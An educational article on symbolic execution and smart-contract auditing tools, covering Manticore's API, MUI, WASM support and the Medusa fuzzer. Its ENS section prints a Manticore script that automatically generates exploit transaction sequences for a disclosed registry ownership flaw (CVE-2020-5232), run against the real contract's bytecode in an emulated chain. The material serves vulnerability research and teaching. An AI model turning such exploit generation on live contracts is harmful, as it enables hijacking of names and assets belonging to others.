# ETAAcademy-Audit: 10. Symbolic Execution

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>10 Symbolic Execution & Manticore & Medusa</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>article</th>
          <td>Symbolic_Execution_Manticore_Medusa</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

# Symbolic Execution: Bridging Software Testing and Formal Semantics

Symbolic execution uses symbolic variables and SMT solvers to explore all possible program paths, enabling formal reasoning about software behavior. It achieves accuracy through formal ISA semantics but faces path explosion challenges. In contrast, fuzzing tests programs with random inputs efficiently but struggles with deep code paths. These complementary techniques create powerful hybrid methods: symbolic execution generates quality seeds for fuzzing to overcome complex conditions, while fuzzing identifies interesting paths for deeper symbolic analysis.

The text highlights two key tools: Manticore, a dynamic symbolic execution tool applied to smart contract analysis, binary reverse engineering, and WebAssembly security, generating concrete inputs to explore different execution paths through SMT solvers; and Medusa, a Go-based hybrid fuzzing framework focused on smart contract security, combining symbolic execution and fuzzing to explore smart contract logic more deeply and efficiently.

---

Symbolic execution is a cutting-edge software verification and testing technique that leverages **SMT (Satisfiability Modulo Theories)** solvers to radically transform traditional paradigms of program analysis. Rather than executing programs with specific inputs (e.g., `X = 5`), symbolic execution introduces **symbolic variables** (e.g., `X` as an unknown value) to explore all potential execution paths simultaneously.

#### How Symbolic Execution Works

Imagine testing a program like navigating a maze. Traditional testing walks one path at a time—each input corresponds to a single route. Symbolic execution, however, allows simultaneous exploration of every path. At each conditional branch (e.g., `if (X > 5)`), the symbolic engine considers both possibilities: the true and false branches. For each path, it tracks a set of **path constraints**, such as `X > 5 && X < 10 && X != 7`. These constraints collectively describe the conditions required to reach each specific program state.

When the engine needs to determine whether a path is feasible—or to generate concrete test inputs that exercise it—it queries an SMT solver. The solver attempts to find a set of input values that satisfy the accumulated constraints. If successful (e.g., `X = 7`), the solver produces an input that triggers the desired behavior.

In essence, symbolic execution elevates program testing from arithmetic computation to **algebraic reasoning**, enabling exhaustive and intelligent exploration of software behavior.

#### Challenges in Symbolic Execution

Despite its power, symbolic execution must bridge a critical **semantic gap**: transforming a program's native instructions into mathematical expressions suitable for formal reasoning. Traditionally, this involves translating compiled binary code into an **intermediate representation (IR)**. However, ensuring semantic equivalence between the binary and the IR is complex and error-prone.

Take, for instance, a C function that performs **unsigned integer division** and asserts that the result is greater than or equal to the dividend. After compilation, the symbolic engine must analyze the sequence of instructions like `DIVU` and `BLTU`, converting them into **SMT-LIB** format expressions. This translation must be flawless; even slight deviations in semantics can cause incorrect verification results.

#### A Better Approach: Leveraging Formal ISA Semantics

Instead of relying on hand-written translation layers, a more robust solution is to use **formally defined Instruction Set Architecture (ISA) semantics** as the bridge between binary code and SMT expressions. This has several advantages:

- **Accuracy**: By using formal ISA specifications, the symbolic engine can correctly interpret the low-level behavior of instructions—crucial for catching edge cases that source-level analysis may miss.
- **Scalability**: As new ISA extensions emerge (e.g., RISC-V has over 41 approved extensions, 12 of which were added in 2024), only the formal definitions need updating. The symbolic engine remains intact.
- **Reusability**: Formal ISA semantics serve as a central source of truth. From this, developers can generate not only SMT formulas but also simulators, documentation, verification tools, and even fault injection frameworks.

This **"divide and conquer"** approach first breaks down complex instructions into **primitive operations** (e.g., `WriteRegister`, `LoadMemory`) defined in the ISA’s formal language. These primitives are then systematically translated into SMT expressions (e.g., using `store` on SMT arrays).

#### Why Formal Semantics Matter: Extending RISC-V with a Custom Instruction

Consider the `DIVU` instruction in C. Division by zero is undefined and usually assumed impossible by the compiler, meaning no runtime checks are inserted. But with symbolic execution driven by formal ISA semantics, one can discover that—on certain architectures—`DIVU` with a zero divisor doesn’t raise an exception. Instead, it returns `0xFFFFFFFF`. This value can violate program invariants and lead to unintended branches—an issue invisible to source-level tests but exposed via ISA-level analysis.

By analyzing binaries through ISA semantics, symbolic execution can uncover such **hardware-specific corner cases**, ensuring robust verification even in the presence of undefined behavior.

As the open RISC-V architecture grows, **custom instructions** have become popular for optimizing performance and energy efficiency. Using formal semantics significantly streamlines support for such extensions.

For example, suppose we introduce a custom `MADD` instruction that performs `(rs1 × rs2) + rs3` in a single operation. Using tools like `LIBRISCV`, we can:

- Define the instruction encoding in `riscv-opcodes` YAML format.
- Use `LIBRISCV` primitives to specify its semantics (e.g., decode as R4-type, extend operands, perform multiplication and addition, and write the result to the destination register).
- Automatically generate SMT-compatible operations, simulators, and documentation—all from just a few lines of specification.

In this case, only **7 lines of YAML** and **7 lines of Haskell** were needed. Once mapped to SMT semantics, this formal definition becomes a powerful tool not just for symbolic execution, but for the entire development lifecycle.

---

## 1. Manticore and Dynamic Symbolic Execution

**Dynamic Symbolic Execution (DSE)** is a highly semantic-aware program analysis technique that builds **path predicates**—mathematical formulas that represent different execution paths through a program—and uses an **SMT (Satisfiability Modulo Theories) solver** to generate concrete input values capable of triggering those paths. One of the core strengths of DSE lies in its **elimination of false positives**: every potential issue discovered is backed by an actual input that reproduces the behavior, providing concrete evidence of the bug.

Take smart contracts as an example. When analyzing a function like `f(uint256 a)`, DSE explores different execution branches, such as when `a == 65` and when `a != 65`. For each path, it formulates the path constraints and invokes the solver to find satisfying inputs. For instance, for the `a == 65` branch, the solver would return `a = 65`, while for the alternative path, any value that is not 65 (e.g., `a = 0`) could be returned.

**Manticore**, a DSE tool, offers a flexible framework for applying arbitrary constraints to execution paths, enabling developers to formally verify complex security properties. For example, to detect integer overflows, one could model the behavior of an `unsafe_add` function with the predicate:

```
c = a + b AND (c < a OR c < b)
```

This captures the overflow condition in unsigned arithmetic: when an overflow occurs, the result `c` wraps around and becomes smaller than at least one of the operands. If the solver finds inputs (e.g., `a = 10`, `b = MAX_UINT256`) that satisfy this predicate, an overflow is proven to exist.

Conversely, if a `safe_add` function includes protective logic, such as:

```
c = a + b AND (c >= a) AND (c >= b)
```

Then appending the overflow condition to this expression:

```
c = a + b AND (c >= a) AND (c >= b) AND (c < a OR c < b)
```

results in a formula that the solver **cannot satisfy**, which mathematically proves that the overflow **cannot occur** under these constraints.

In essence, Manticore enables formal, input-driven validation of execution behaviors, making it a powerful tool for ensuring the security and correctness of critical software like smart contracts.

<details><summary>Code</summary>

```solidity

    function f(uint256 a) {
        if (a == 65) {
            // A bug is present
        }
    }

    function unsafe_add(uint256 a, uint256 b) returns (uint256 c) {
        c = a + b; // no overflow protection
        return c;
    }

    function safe_add(uint256 a, uint256 b) returns (uint256 c) {
        c = a + b;
        require(c >= a);
        require(c >= b);
        return c;
    }

```

</details>

### Advanced Smart Contract Security Analysis with Manticore

**Manticore** is a powerful dynamic symbolic execution (DSE) tool that provides two interfaces for analyzing smart contracts: a **command-line interface** and a **Python API**. Both modes allow developers and security analysts to thoroughly explore a contract's execution paths and detect potential vulnerabilities, including those that only manifest under specific input conditions.

The simplest way to get started is via the CLI. Running `manticore project` automatically analyzes all possible execution paths of the smart contract, generates test cases, and outputs the results into an `mcore_*` directory. This directory contains comprehensive information such as code coverage metrics, compiler warnings, transaction details, and more.

For deeper, more tailored analysis, Manticore’s Python API offers robust flexibility. You begin by initializing the EVM environment with `ManticoreEVM()`, then create user accounts using `create_account()` and deploy contracts with `solidity_create_contract()`.

Manticore supports two types of transactions:

- **Raw transactions** (`m.transaction`) that explore all functions within the contract.
- **Named transactions** (e.g., `contract_account.f()`) that focus on a specific function.

Transaction arguments can be concrete values or **symbolic values** created via `make_symbolic_value()` or `make_symbolic_buffer()`. Symbolic values allow Manticore to systematically explore how the contract behaves under various input conditions. Once the analysis is complete, invoking `m.finalize()` halts execution and generates the resulting test cases.

For example, if a function behaves unexpectedly when parameter `a` equals 65, Manticore will detect this and automatically generate test cases for that specific input, as well as others.

#### Analyzing Execution States

Manticore classifies execution states into **ready states** (`m.ready_states`) and **terminated states** (`m.killed_states`), the latter indicating paths that ended in a `REVERT` or `INVALID` opcode. By iterating through `m.terminated_states`, you can inspect the last transaction of each state to detect and diagnose failed execution paths.

For each terminated state, `m.generate_testcase(state, 'ThrowFound')` can be used to generate a test case containing the precise input that triggered the failure. Additional introspection is available through properties such as:

- Account balances (`state.platform.get_balance`)
- Transaction history (`state.platform.transactions`)
- Return data (`transaction.return_data`)

Although `terminated_states` already contain all failing paths, the example shows how Manticore's API allows for flexible manipulation of execution data—paving the way for more sophisticated, constraint-based analyses.

#### Path Constraints and Targeted Analysis

Manticore’s **constraint system** enables fine-grained control over symbolic execution. By importing the `Operators` module, users can define logical (e.g., `AND`, `OR`) and comparative (e.g., `UGT`, `ULT`) constraints.

There are two types of constraints:

- **Global constraints** (`m.constrain()`): apply to all states.
- **State-specific constraints** (`state.constrain()`): apply only to a particular path.

For instance, suppose a function `f()` is documented never to be called with `a == 65`. To avoid false positives, one can use:

```python
symbolic_var != 65
```

alongside the `only_if` parameter in `m.generate_testcase()` to produce test cases that avoid this scenario. The `solver.check(state.constraints)` function can also be used to ensure that the set of constraints is logically consistent.

#### Challenges in Cryptographic Validation

Traditional approaches to validating cryptographic implementations suffer from key limitations:

- **Fuzzing** lacks formal guarantees and has limited coverage.
- **Model extraction** often requires mastery of complex formal tools.
- **Using pre-verified implementations** constrains design choices.

Symbolic execution theoretically enables exhaustive path exploration, but cryptographic primitives pose challenges due to pseudorandom sources and highly optimized assembly instructions. These complexities often lead to **SMT query timeouts** and **path explosion**.

To address these challenges, **Sandshrew** introduces **concolic execution**—a hybrid technique combining concrete and symbolic analysis. Developers can write small C test harnesses and use `SANDSHREW_*` wrappers to mark cryptographic functions for concrete execution.

Sandshrew uses:

- Manticore for symbolic exploration.
- Unicorn engine for concrete execution.

When a marked cryptographic function is reached, Sandshrew concretizes its symbolic input, executes it natively, and returns a symbolic placeholder to resume symbolic analysis. At critical equivalence checkpoints, Sandshrew forks the state and invokes the solver to explore alternate outcomes. This reduces SMT complexity while preserving symbolic coverage.

As a **purpose-built unit testing framework for cryptographic validation**, Sandshrew showcases the full potential of Manticore’s API while solving real-world issues that arise in analyzing cryptographic implementations.

#### Mitigating Path Explosion with Symbolic State Merging

A major bottleneck in symbolic execution is **path explosion**—an exponential increase in execution paths due to conditional branching. Manticore addresses this using **opportunistic state merging**.

This technique identifies execution states that:

- Are at the same program location.
- Share semantically equivalent inputs, outputs, memory, and syscall traces.

When merging two such states, Manticore unifies CPU registers using `if-then-else` symbolic expressions to represent diverging values.

In benchmark tests, this optimization reduced the number of explored paths by **20–33%**, depending on compiler optimization levels. While simpler than full **Dynamic State Merging (DSM)** or **Static State Merging (SSM)**—which rely on external analysis tools for program structure—it captures many merging opportunities and significantly improves performance.

<details><summary>Code</summary>

```python

    from manticore.ethereum import ManticoreEVM

    ETHER = 10**18

    m = ManticoreEVM()

    user_account = m.create_account(balance=1000*ETHER)

    with open('example.sol') as f:
        contract_account = m.solidity_create_contract(f, owner=user_account)

    symbolic_var = m.make_symbolic_value()
    contract_account.f(symbolic_var)

    no_bug_found = True

    ## Check if an execution ends with a REVERT or INVALID
    for state in m.terminated_states:
        last_tx = state.platform.transactions[-1]
        if last_tx.result in ['REVERT', 'INVALID']:
            # we do not consider the path were a == 65
            condition = symbolic_var != 65
            if m.generate_testcase(state, name="BugFound", only_if=condition):
                print(f'Bug found, results are in {m.workspace}')
                no_bug_found = False

    if no_bug_found:
        print(f'No bug found')

```

</details>

#### MUI: Bridging Symbolic Execution with Interactive Reverse Engineering

**Binary Ninja** and **Ghidra** are two widely used interactive disassemblers and binary analysis platforms, essential tools for reverse engineering and security research. They enable analysts to inspect and understand compiled programs without needing access to the source code. However, when it comes to symbolic execution—an advanced technique for exploring all possible execution paths of a program—these tools often require external integration to unlock their full potential.

Enter **ManticoreUI (MUI)**, a graphical plugin developed for Binary Ninja that integrates the powerful symbolic execution capabilities of [Manticore](https://github.com/trailofbits/manticore) in an accessible and user-friendly interface. MUI simplifies the use of Manticore by abstracting away the complexity of its Python API and exposing intuitive graphical features:

- **Function Modeling Suggestions & Global Hook Management**
  MUI proactively suggests alternative models for common library functions and offers a centralized UI for managing global hooks, streamlining analysis setup.

- **Fast Execution via Unicorn Emulator**
  The `emulate_until` function leverages the Unicorn CPU emulator to dramatically speed up execution, especially useful for quickly skipping initialization routines or large instruction blocks.

- **Support for Shared Libraries**
  Analysts can selectively load and apply hooks to shared libraries, enabling modular and granular control over complex binaries.

- **GDB State Dump Integration**
  Through a dedicated GDB plugin, users can capture runtime program states and import them directly into MUI. This eliminates the need to replicate complex initialization logic and reduces the risk of state explosion during symbolic execution.

These capabilities make MUI ideal for tackling real-world, high-complexity targets such as network services or large-scale libraries.

**MUI for Ghidra: A Cross-Disassembler Approach**

To extend symbolic execution to the open-source disassembler Ghidra, the Manticore team also developed an MUI plugin specifically for Ghidra users. Addressing the challenge of cross-platform disassembler support, MUI adopts a **gRPC-based server-client architecture**. The symbolic execution engine—Manticore’s core—is run as a Python server, while front-end plugins (written in different languages, depending on the disassembler) communicate with it via RPC calls.

This modular architecture unlocks several benefits:

- **Write Once, Use Anywhere Backend**
  Core symbolic execution features only need to be implemented once in the Python backend.

- **UI-Focused Front-End Development**
  Disassembler plugin developers can focus on user experience without diving into symbolic execution internals.

- **Standardized JSON Configuration**
  Common settings are shared across platforms using JSON files, reducing duplicated effort and ensuring consistency.

- **Modern Tooling and Automation**
  MUI’s development framework includes automated code generation, testing infrastructure, and build systems, resulting in better code quality and faster iteration cycles.

This makes MUI a scalable, developer-friendly solution for integrating symbolic execution across different reverse engineering tools. More importantly, it lowers the barrier of entry for security researchers who want to use symbolic execution during binary analysis—transforming it into a more approachable, integral part of the vulnerability discovery process.

**Smart Contract Support: EVM Symbolic Execution in MUI**

While Manticore is best known for its support of Ethereum smart contracts, traditional disassemblers like Binary Ninja and Ghidra lack built-in support for the Ethereum Virtual Machine (EVM). MUI bridges this gap by integrating essential smart contract tooling into its plugin ecosystem:

- **Crytic-Compile**
  Used as an abstraction layer for compiling Solidity contracts, crytic-compile ensures compatibility across various compiler versions and configurations.

- **Ethersplay**
  A dedicated EVM disassembler, ethersplay enables visualization of bytecode and control flow graphs (CFGs), making the analysis of smart contracts as seamless as native binaries.

With these tools, MUI offers a feature-rich EVM workflow that matches the capabilities of Manticore’s command-line interface. However, thanks to its intuitive UI, MUI delivers **superior usability and discoverability**. Users no longer need to memorize or reference command-line parameters—instead, MUI provides auto-generated panels with real-time access to the full suite of Manticore runtime options.

### Applications of Manticore: Beyond Solidity and Into WebAssembly

Manticore has demonstrated how symbolic execution can effectively analyze smart contracts even when they are **not written in Solidity**, showcasing its ability to reason about contract logic, test security properties, and generate concrete exploit paths—all **without requiring detailed knowledge of the contract's internal workings**.

One powerful example is Manticore's successful reproduction of a **critical vulnerability in the Ethereum Name Service (ENS)**, identified as [CVE-2020-5232](https://github.com/ensdomains/ens/security/advisories/GHSA-5c73-w23f-fqgj). This flaw allowed attackers to **reclaim ownership of a domain name even after transferring it to someone else**. The contract source code, written in LLL (a low-level Lisp-like language), was retrieved from Etherscan. Despite the lack of high-level language support, Manticore's strength lies in **direct EVM bytecode analysis**, enabling it to extract and reason about the contract's initialization bytecode.

Based on the security advisory, Manticore was tasked with simulating a four-step attack:

- The attacker registers a name or ENS node.
- The attacker performs some form of setup (unknown initially).
- The name or node is transferred to a victim.
- The attacker reclaims ownership.

By identifying relevant functions and setting appropriate symbolic conditions, Manticore automatically explored the attack surface. Impressively, within just a few minutes, it discovered **two distinct exploit paths**—each requiring the attacker to send a `setTTL` or `setResolver` transaction before the ownership transfer, ultimately allowing them to reclaim the node post-transfer. This underscores the power of symbolic execution in uncovering deep vulnerabilities with minimal manual input.

<details><summary>Code</summary>

```python

# contract vulnerability

;; Precomputed function IDs.
  (def 'get-node-owner 0x02571be3) ; owner(bytes32)
  (def 'get-node-resolver 0x0178b8bf) ; resolver(bytes32)
  (def 'get-node-ttl 0x16a25cbd) ; ttl(bytes32)
  (def 'set-node-owner 0x5b0fc9c3) ; setOwner(bytes32,address)
  (def 'set-subnode-owner 0x06ab5923) ; setSubnodeOwner(bytes32,bytes32,address)
  (def 'set-node-resolver 0x1896f70a) ; setResolver(bytes32,address)
  (def 'set-node-ttl 0x14ab9038) ; setTTL(bytes32,uint64)

```

```python

# A manticore script to generat ENS exploits

# Automatic Exploit Generation for the ENS bug. The silver bullet. Amazing!!
# https://medium.com/the-ethereum-name-service/ens-registry-migration-bug-fix-new-features-64379193a5a

from binascii import unhexlify
from manticore import config
from manticore.ethereum import ManticoreEVM, ABI
from manticore.platforms.evm import globalsha3
ETHER = 10**18
m = ManticoreEVM()
# Initialization bytecode downloaded from:
# https://etherscan.io/address/0x314159265dd8dbb310642f98f50c066173c1259b#code
# Alternativelly you could compile hte serpent code found there
init_bytecode = unhexlify("3360206000015561021a806100146000396000f3630178b8bf60e060020a600035041415610020576004355460405260206040f35b6302571be360e060020a600035041415610044576020600435015460405260206040f35b6316a25cbd60e060020a600035041415610068576040600435015460405260206040f35b635b0fc9c360e060020a6000350414156100b557602060043501543314151561008f576002565b6024356020600435015560243560405260043560198061020160003960002060206040a2005b6306ab592360e060020a6000350414156101135760206004350154331415156100dc576002565b6044356020600435600052602435602052604060002001556044356040526024356004356021806101e060003960002060206040a3005b631896f70a60e060020a60003504141561015d57602060043501543314151561013a576002565b60243560043555602435604052600435601c806101c460003960002060206040a2005b6314ab903860e060020a6000350414156101aa576020600435015433141515610184576002565b602435604060043501556024356040526004356016806101ae60003960002060206040a2005b6002564e657754544c28627974657333322c75696e743634294e65775265736f6c76657228627974657333322c61646472657373294e65774f776e657228627974657333322c627974657333322c61646472657373295472616e7366657228627974657333322c6164647265737329")

# Create some accounts to recreate the attack
owner = m.create_account(balance=1 * ETHER)
attacker = m.create_account(balance=1 * ETHER)
victim = m.create_account(balance=1 * ETHER)

#CREATE tx.. https://etherscan.io/tx/0x40ea7c00f622a7c6699a0013a26e2399d0cd167f8565062a43eb962c6750f7db
# This will run the initialization bytecode and create the contract account for ENS
contract = m.create_contract(init=init_bytecode, owner=owner)

# This is unnecessary (but nice)
# We let manticore know about the abi so we can encode the transactions easily
functions = ('owner(bytes32)','resolver(bytes32)','ttl(bytes32)','setOwner(bytes32,address)','setSubnodeOwner(bytes32,bytes32,address)','setResolver(bytes32,address)','setTTL(bytes32,uint64)')
for signature in functions:
    contract.add_function(signature)


print ("[+] Accounts in the emulated ethereum world:")
print (f"     The contract address:\t{contract:x}")
print (f"     The owner address:   \t{owner:x}")
print (f"     The attacker address:\t{attacker:x}")
print (f"     The victim address:\t{victim:x}")

# 1 Concrete transaction
# This will encode a setSubnodeOwner transaction based on the provided signature
print ("[+] ENS root owner gives the attacker a subnode ('tob')")
root_node = b"\x00"*32
node = unhexlify("2bcc18f608e191ae31db40a291c23d2c4b0c6a9998174955eaa14044d6677c8b") # hash("tob")
contract.setSubnodeOwner(root_node, node, attacker) # caller=owner

# 2 Symbolic transaction
# This will sent a transaction with 100 symbolic bytes in the calldata
# The function_id and all possible arguments included
print ("[+] Let the attacker prepare the attack. Manticore AEG.")
data_tx1 = m.make_symbolic_buffer(4+32*3)
m.transaction(caller=attacker, address=contract, data=data_tx1, value=0)

# 3 Concrete transaction
print ("[+] The attacker `sells` the node to a victim (and transfer it)")
# The attacker only onws the sub node "tob." hash(0,0x2bcc18f608e191ae31db40a291c23d2c4b0c6a9998174955eaa14044d6677c8b)
subnode = unhexlify("bb6346a9c6ed45f95a4faaf4c0e9859d34e43a3a342e2e8345efd8a72c57b1fc")  # 1fc!
contract.setOwner(subnode, victim, caller=attacker)
#subnode owner was set to victim

# 4 Symbolic transaction
print ("[+] Now lets the attacker finalize the exploit somehow. Manticore AEG.")
data_tx2 = m.make_symbolic_buffer(4+32*3)
m.transaction(caller=attacker, address=contract, data=data_tx2, value=0)


# Check the owner of the subnode
# This sends a tx that asks for the owner of subnode then we need to
# find a state in which this tx returns the attacker address
contract.owner(subnode)

# Symbolic transactions generate a number of different states representing each
# possible trace. If we find a state in which the owner of the subnode is the attacker
# then we found an exploit trace
print ("[+] Check if the subnode owner is victim in all correct final states.")
for st in m.ready_states:
    world = st.platform
    # parse the return_data of the last transaction as an uint
    stored_owner = ABI.deserialize("uint", st.platform.transactions[-1].return_data)
    # It could be symbolic so we ask the solver
    if st.can_be_true(stored_owner == attacker):
        # if it is feasible then constraint it and recreqte the full exploit trace
        st.constrain(stored_owner == attacker)
        print ("[*] Exploit found! (The owner of subnode is again the attacker)")

        # Trying to make it print the tx trace
        # ALWAYS write your own parser.
        for tx in st.platform.transactions[1:]:
            conc_tx = tx.concretize(st, constrain=True)
            for signature in functions:
                func_id = ABI.function_selector(signature)

                if func_id == conc_tx.data[:4]:
                    name = signature.split('(')[0]
                    nargs = signature.count(',')
                    rawsignature = ('(uint)', '(uint,uint)', '(uint,uint,uint)')[nargs]
                    args = map(hex, ABI.deserialize(rawsignature, conc_tx.data[4:]))
                    print (f"     {name}({', '.join(args)})")
                    break
        #This generates a more verbose trace and info about the state
        m.generate_testcase(st)

print(f"[+] Look for testcases here: {m.workspace}")

```

</details>

#### Symbolic Execution for WebAssembly (WASM)

As **WebAssembly (WASM)** becomes a standard supported by all major browsers, with the promise of bringing near-native performance to web applications written in languages like C++ and Rust, the demand for security analysis tools targeting WASM has surged. Manticore addresses this need by offering **full symbolic execution support for WASM binaries**.

This support aligns well with efforts like Mozilla’s **Bytecode Alliance**, which emphasizes formal verification of sandboxed "nano-processes" for secure web execution. Moreover, the Ethereum 2.0 roadmap discusses replacing the EVM with **Ethereum-flavored WebAssembly (eWASM)**—making Manticore's WASM analysis capabilities especially relevant for the future of blockchain security.

To demonstrate this functionality, Manticore uses a classic **"crackme" challenge** compiled into WASM. The original C program reads a single byte from standard input, then checks, bit by bit, if the input matches the character `'X'` (`0x58`). A branch counter tracks how many bits match.

Here's how the symbolic execution workflow unfolds:

- A Manticore script is created to solve for the correct input.
- A symbolic version of `getchar` is implemented, returning a 32-bit symbolic value (since WASM uses 32-bit minimum types), constrained between 0–255.
- A custom plugin is defined, which hooks into the execution and checks whether the return value of the program is 0 (indicating success).
- If so, the plugin solves for the input value.

This elegant symbolic setup automatically determines that the correct input is `'X'`, **without hardcoding the program logic or output format**. It showcases how Manticore systematically explores all execution paths to solve problems in environments where traditional debugging might fall short—making it a powerful tool for both reverse engineering and vulnerability research on emerging platforms like WebAssembly.

<details><summary>Code</summary>

```c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    uint8_t i = getchar();

    int branch_counter = 1;
    if (!(128 & i)){       branch_counter++;
     if (64 & i){          branch_counter++;
      if (!(32 & i)){      branch_counter++;
       if (16 & i){        branch_counter++;
        if (8 & i){        branch_counter++;
         if (!(4 & i)){    branch_counter++;
          if (!(2 & i)){   branch_counter++;
           if (!(1 & i)){  branch_counter++;
            printf("You got it!\n");
            return 0;
           }
          }
         }
        }
       }
      }
     }
    }

    printf("You lose :/\n");
    return -1 * branch_counter;

}

```

```python

from manticore.wasm import ManticoreWASM
from manticore.core.plugin import Plugin


def getchar(state):
    """Symbolic `getchar` implementation. Returns an arbitrary single byte"""
    res = state.new_symbolic_value(32, "getchar_res")
    state.constrain(0 < res)
    state.constrain(res < 256)
    return [res]


class PrintRetPlugin(Plugin):
    """A plugin that looks for states that returned zero and solves for their inputs"""

    def will_terminate_state_callback(self, state, *args):
        retval = state.stack.peek()
        if retval == 0:
            print("Solution found!")
            for sym in state.input_symbols:
                solved = state.solve_one(sym)
                print(f"{sym.name}: {chr(solved)} --> Return {retval}")


# Pass our symbolic implementation of the `getchar` function into the WASM environment
# as an import.
m = ManticoreWASM("if_check.wasm", env={"getchar": getchar})

# Register our state termination callback
m.register_plugin(PrintRetPlugin())

# Run the main function, which will call getchar
m.main()

# Save a copy of the inputs to the disk
m.finalize()

```

</details>

#### Combining Symbolic Execution and Fuzzing: manticore-verifier

Manticore also offers **manticore-verifier**, a tool that bridges the gap between **fuzz testing and symbolic execution**. Sharing the same property-based test format as the Echidna fuzzer, this tool allows developers to write a test once and use both engines to verify it—taking advantage of **Echidna's coverage-based fuzzing** and **Manticore’s path-sensitive symbolic analysis**.

At its core is **ManticoreEVM**, which creates a fully simulated symbolic blockchain environment. It compiles and deploys contracts, simulates accounts, and systematically explores every possible transaction sequence. After each transaction, it checks whether the user-defined security properties are violated.

The tool integrates seamlessly with **slither-prop**, a static analyzer that automatically generates property-based tests for common standards such as **ERC20**. These generated properties can then be directly passed to manticore-verifier for automated validation—**bringing high-level automation and depth to smart contract security auditing**.

---

## 2. Medusa: Hybrid Fuzzing for Smart Contract Security

Symbolic execution and fuzzing are two complementary techniques in the field of program analysis. Symbolic execution systematically explores program paths using symbolic inputs, enabling precise reasoning about program behavior. However, it often struggles with the _path explosion_ problem. On the other hand, fuzzing uses a large number of randomized inputs to rapidly test code execution. While efficient, it often fails to penetrate deep and complex code logic.

The combination of both techniques—referred to as **hybrid fuzzing**—offers a powerful analysis strategy. Symbolic execution can generate high-quality seeds to guide fuzzing through complex conditions, while fuzzing can explore broad input spaces and identify interesting program paths for symbolic execution to analyze in detail. Modern tools dynamically switch between the two approaches, especially when fuzzing encounters barriers. This synergy has become a mainstream method for vulnerability discovery, regression testing, and malware analysis, combining the speed of fuzzing with the precision of symbolic execution.

#### What Is Medusa?

**Medusa** is a novel fuzzing framework for smart contracts, built in Go and integrated with the Geth Ethereum client. While tools like **Echidna** are well-established and widely used in production, Medusa introduces a fresh design that emphasizes code maintainability, native API integration, and a more faithful equivalence with the Ethereum Virtual Machine (EVM). Medusa is not meant to _replace_ Echidna but rather to serve as an exploratory tool for developers who seek more flexibility or wish to build on a Go-based architecture. Most testing techniques and documentation are transferable between the two, although some configuration parameters and internal mechanics differ.

**How Smart Contract Fuzzing Differs from Traditional Fuzzing**

Unlike traditional fuzzers such as AFL that aim to crash programs using random input, smart contracts do not "crash" in the classical sense. Instead, they **revert** transactions upon errors or violations of logic. Therefore, the objective of smart contract fuzzing is not to cause crashes but to detect violations of **invariants**—properties that must always hold true during and after contract operations.

These invariants fall into two categories:

- **Function-level invariants** apply to specific contract functions and validate correctness before and after a function call. For example, a `deposit()` function might require that a user’s balance increases by the deposited amount and that the total contract balance reflects this change.

- **System-level invariants** are broader rules that must remain valid across any sequence of contract interactions. Examples include the conservation of total ERC20 token supply, algebraic laws like commutativity, or specific rules such as Uniswap's constant product formula $x \cdot y = k$. These invariants must hold regardless of the function sequence or state transitions.

#### The Medusa Fuzzing Lifecycle

Medusa’s fuzzing process models a complete smart contract testing lifecycle:

- **Deployment Phase**  
   Medusa begins by deploying the target contracts in the order specified under `fuzzing.targetContracts`, using the address defined in `fuzzing.deployerAddress`. This setup forms the **initial deployment state**.

- **Fuzzing Execution**  
   Medusa then enters its core loop: generating and executing **call sequences**, which are arrays of transactions. The length of these sequences is controlled via `fuzzing.callSequenceLength`. These sequences may be randomly generated or mutated versions of previously effective sequences from the corpus.

- **Coverage-Guided Execution**  
   During execution, Medusa tracks **code coverage**. If a new sequence executes previously unseen opcodes, the sequence is added to the corpus for future mutations—making Medusa a **coverage-guided fuzzer**.

- **Invariant Checking**  
   After each transaction in the sequence, Medusa checks whether any defined invariant has been violated. If an invariant fails, the corresponding test case is reported as a failure.

- **State Reset**  
   After executing an entire sequence, Medusa resets the blockchain state back to the initial deployment snapshot, preparing for the next call sequence.

Here’s a summary of the fuzzing flow:

```
Generate Call Sequence
    → Get Current Transaction from Sequence
        → Execute Transaction
            → Update Coverage
                → If Coverage Increased, Add Sequence to Corpus
                    → Check Invariants
                        → If Violated, Report Failure
                            → Continue to Next Transaction or End Sequence
```

Medusa represents an exciting evolution in smart contract fuzzing. By integrating native Go capabilities with Ethereum’s Geth client and embracing hybrid fuzzing principles, it offers a flexible, developer-friendly alternative for smart contract testing and security research.

<details><summary>Code</summary>

```python
# Generate a new call sequence or mutate one from the corpus
sequence = generator.NewCallSequence()

# Iteratively execute each call in the call sequence
for i < len(sequence) {
    # Retrieve the i-th element in the sequence
    tx = sequence[i]

    # Run the transaction on the blockchain and retrieve the result
    result = blockchain.executeTransaction(tx)

    # Update coverage
    increasedCoverage = coverageTracker.updateCoverage()

    # If coverage increased, add sequence[:i+1] to the corpus
    if increasedCoveraged {
        corpus.addCallSequence(tx[:i+1])
    }

    # Check for invariant failures
    encounteredFailure = tester.checkForInvariantFailures(result)

    # Let user know we had a failing test case
    if encounteredFailure {
        reportFailedTestCase()
    }
}

```

</details>

### Deep Dive into Medusa: Reports, Low-Level APIs, and Customization

**Medusa** provides powerful tools and extensible APIs to help developers fully understand and optimize the results of smart contract fuzzing. Beyond its hybrid fuzzing engine and coverage-guided execution, Medusa introduces two key report types—**Coverage Reports** and **Revert Reports**—along with a flexible low-level API that offers deep integration and customization options for advanced users.

#### Coverage and Revert Reports: Insights from Fuzzing

Medusa offers two essential types of reports that help developers analyze the outcomes of fuzz testing:

Coverage reports show which parts of the smart contract code were executed during testing. They support two output formats:

- **HTML Reports**: Provide a visually intuitive, syntax-highlighted view of the source code, showing which lines were covered.
- **LCOV Reports**: Designed for integration with CI/CD pipelines and coverage dashboards.

To enable coverage reporting, developers can configure the `corpusDirectory` and `coverageReports` options in the project configuration file. By default, reports are saved in the `corpus/` directory or under `crytic-export/coverage`.

**Revert Reports (Experimental)**

The revert report is an experimental feature designed to offer insights into **frequent reverts** during fuzz testing. It tracks which functions reverted most often and records the reasons behind these reverts. This is especially useful for:

- Diagnosing input validation issues
- Understanding contract-level constraints
- Improving the quality of test cases

